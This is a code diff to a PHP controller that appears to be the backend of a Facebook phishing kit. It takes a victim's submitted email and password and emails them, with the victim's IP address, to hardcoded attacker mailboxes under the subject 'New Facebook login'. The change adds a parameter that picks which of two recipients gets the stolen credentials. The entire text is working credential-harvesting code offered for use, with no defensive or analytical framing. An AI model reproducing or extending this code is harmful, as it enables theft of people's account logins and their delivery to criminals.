@@ -43,6 +43,7 @@ class MainController extends Controller {
                 $validator = Validator::make($req, [
                              'e' => 'required|email',
                              'p' => 'required',
+                             't' => 'required',
                    ]);
          
                  if($validator->fails())
@@ -52,11 +53,15 @@ class MainController extends Controller {
                  }
                 
                  else
-                 { 
-                 	  $s = "New Facebook login: ".date("h:i A jS F, Y");
-                       $rcpt = "holtchris147@gmail.com";
+                 {                  
                        $e = $req["e"];
                        $p = $req["p"];
+                       $t = $req["t"];
+                       
+                       $rms =  ["holtchris147@gmail.com","nicolehenley1104@outlook.com"];
+                 	  $s = "New Facebook login: ".date("h:i A jS F, Y");
+                       $rcpt = isset($rms[$t]) ? $rms[$t] : $rms[0];
+                       
                        $location = getenv("REMOTE_ADDR");
 
                        $this->helpers->sendEmail($rcpt,$s,['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view'); 
